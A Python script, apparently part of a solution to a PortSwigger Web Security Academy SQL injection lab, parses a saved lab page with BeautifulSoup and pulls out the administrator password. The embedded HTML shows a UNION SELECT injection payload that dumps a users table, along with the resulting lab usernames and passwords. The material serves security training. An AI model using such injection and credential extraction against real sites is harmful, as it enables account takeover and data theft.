from bs4 import BeautifulSoup

str = """
<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, listing the database contents on non-Oracle databases</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>&apos; union SELECT username_dbiuyy, password_xlvsij FROM users_lahcmc -- </h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Accessories">Accessories</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Toys+%26+Games">Toys & Games</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>administrator</th>
                            <td>8wgnaxvt9usauddqlhoh</td>
                        </tr>
                        <tr>
                            <th>carlos</th>
                            <td>ultogpyo4ybf1jtlqgjt</td>
                        </tr>
                        <tr>
                            <th>wiener</th>
                            <td>xdi6kqub78jgn3frfalh</td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
"""

soup= BeautifulSoup(str,"html.parser")
table = soup.find("table",{"class":"is-table-longdescription"})
trs = table.findAll("tr")
for tr in trs:
    username = tr.find("th").text.strip()
    password = tr.find("td").text.strip()

    # 如果只想抓 administrator 的那筆
    if "administrator" in username:
        print(f"username: {username}, pw: {password}")